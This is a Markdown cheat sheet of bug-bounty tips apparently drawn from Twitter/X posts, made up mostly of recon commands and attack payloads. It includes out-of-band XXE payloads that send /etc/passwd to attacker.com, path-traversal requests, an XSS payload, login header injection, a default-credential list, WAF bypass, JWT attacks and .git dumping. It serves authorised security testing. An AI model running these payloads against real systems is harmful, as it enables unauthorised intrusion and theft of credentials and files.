# Twitter Tips — Part 1

A curated collection of bug-bounty tips originally shared on Twitter / X.

## Tip 1 — Role escalation via parameter pollution

When testing role-based access control, try sending the same parameter twice with different values:

```
POST /api/users/update
role=user&role=admin
```

Some applications use the first value for authorization checks and the last value for the actual update.

## Tip 2 — IIS path traversal

```
GET /aspnet_client/system_web/4_0_30319/update/..%2f..%2f..%2f..%2fwindows/win.ini
GET /uploads/../../../web.config
```

## Tip 3 — CloudFront / WAF bypass via host-header swap

Some sites are protected by CloudFront / Akamai / Cloudflare in front of an exposed origin. Find the origin IP (Censys, Shodan, historical DNS records) and send requests directly to the origin with the original `Host` header.

```bash
curl -H "Host: target.com" https://origin-ip/admin
```

## Tip 4 — JS file recon

```bash
# Pull JS files from a target
echo "target.com" | gau --threads 5 | grep "\.js$" | sort -u > js.txt

# Look for endpoints, secrets, API keys
cat js.txt | while read url; do
   curl -s "$url" | grep -E "(api[_-]?key|token|secret|password|/api/|/v1/)" 
done

# Use LinkFinder
python linkfinder.py -i js.txt -o cli

# Use SecretFinder
python SecretFinder.py -i target.com -o cli
```

## Tip 5 — `wp-config.php` file swap

When you find a backup of `wp-config.php` (e.g. `wp-config.php.bak`, `wp-config.php~`, `wp-config.old`), it usually contains DB credentials. Try the following naming variants:

```
wp-config.php.bak
wp-config.php~
wp-config.old
wp-config.php.swp
wp-config.php.swo
wp-config.php.save
.wp-config.php.swp
wp-config.txt
wp-config.php.txt
```

## Tip 6 — Default credentials are still the king

Always test default credentials on admin panels, especially for:

```
- Routers (admin/admin, admin/password)
- Tomcat (tomcat/tomcat, manager/manager)
- Jenkins (admin/admin)
- phpMyAdmin (root/root, root/<empty>)
- WordPress (admin/admin, admin/password)
- Drupal (admin/admin)
- Joomla (admin/admin)
- Cisco (cisco/cisco)
- HP iLO (Administrator/<8-char serial>)
```

## Tip 7 — Nmap workflows for bug bounty

```bash
# Top 1000 ports — fast
nmap -sS -T4 -p- --min-rate=5000 target.com

# Service detection on open ports
nmap -sV -sC -p<open-ports> target.com

# Full scan with NSE scripts
nmap -A -sV -p- --script=vuln target.com

# Scan multiple targets from a file
nmap -iL targets.txt -oA scan-results
```

## Tip 8 — Tor scanning for anonymity

```bash
proxychains nmap -sT -Pn -n target.com
torsocks curl https://target.com
```

## Tip 9 — GitHub token leaks

Search GitHub for org-specific secrets:

```
# Use trufflehog
trufflehog github --org=target-org

# Use gitleaks
gitleaks detect --source=. --report-path=report.json

# Manual searches
"target.com" password
"target.com" api_key
"target.com" token
"target.com" "BEGIN RSA PRIVATE KEY"
```

## Tip 10 — Shodan dorks for bug bounty

```
hostname:"target.com"
ssl:"target.com"
org:"Target Inc"
http.title:"Target"
http.html:"powered by target"
http.favicon.hash:<favicon-hash>
```

## Tip 11 — JIRA dorks

```
inurl:/jira site:target.com
inurl:/secure/Dashboard.jspa site:target.com
inurl:/rest/api/2/ site:target.com
```

## Tip 12 — GitHub CSV recon

Use GitHub's search API to find files containing the target's name:

```
"target.com" extension:csv
"target.com" extension:json
"target.com" extension:env
"target.com" extension:yaml
"target.com" filename:.env
"target.com" filename:config
"target.com" filename:credentials
```

## Tip 13 — XSS one-liners

```bash
# Reflection scan via gxss + dalfox
echo "target.com" | gau \
  | grep "=" \
  | qsreplace -a \
  | gxss -p eXcSr \
  | dalfox pipe

# Wayback + qsreplace
echo "target.com" | waybackurls \
  | grep "=" \
  | qsreplace '"><svg/onload=alert(1)>' \
  | tee xss.txt

# Subdomain → URL → XSS
subfinder -d target.com -silent \
  | httpx -silent \
  | gau \
  | grep "=" \
  | qsreplace -a \
  | dalfox pipe
```

## Tip 14 — XML → XXE

When you find an endpoint that accepts XML, try the standard XXE payloads:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Out-of-band -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;]>
<foo>&send;</foo>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>">
%all;
```

## Tip 15 — AlienVault OTX data

Use OTX to find historical URLs and indicators for a target:

```
https://otx.alienvault.com/api/v1/indicators/domain/target.com/url_list
https://otx.alienvault.com/api/v1/indicators/hostname/target.com/passive_dns
```

## Tip 16 — phpMyAdmin case-bypass

Some phpMyAdmin filters block `phpmyadmin` (lowercase) but accept variations:

```
/PhpMyAdmin/
/PHPMYADMIN/
/phpMyAdmin/
/PMA/
/pMa/
```

## Tip 17 — robots.txt → sensitive paths

`robots.txt` often **discloses** the very endpoints developers are trying to hide. Always read it first:

```
GET /robots.txt
GET /sitemap.xml
GET /sitemap_index.xml
GET /humans.txt
GET /security.txt
GET /.well-known/security.txt
```

## Tip 18 — Burp Collaborator for blind bugs

Use Burp Collaborator (or `interactsh`) to detect blind vulnerabilities:

```
- Blind XSS (in admin panels, support tickets, log dashboards)
- Blind SSRF (in fetch-from-URL features, image processors, PDF generators, webhook endpoints)
- Blind XXE
- Blind Command Injection
- Blind SQL Injection (DNS exfiltration via xp_dirtree on MSSQL)
```

## Tip 19 — Header injection on the login page

```
POST /login HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Forwarded-Server: attacker.com
X-Host: attacker.com
X-Real-IP: 127.0.0.1
```

## Tip 20 — JWT manipulation cheatsheet

```
1. Change "alg" to "none" (alg=none attack)
2. Change "alg" from RS256 to HS256 and sign with the public key
3. Try a weak secret with hashcat / jwt_tool
4. Modify "kid" to point to a controlled key
5. Try injection in "kid" (e.g. "kid": "/etc/passwd")
6. Look for JKU / X5U abuse
```

## Tip 21 — Test the `/.git/` exposure

```
GET /.git/HEAD
GET /.git/config
GET /.git/logs/HEAD

# If exposed, dump it:
git-dumper https://target.com/.git/ ./loot
```
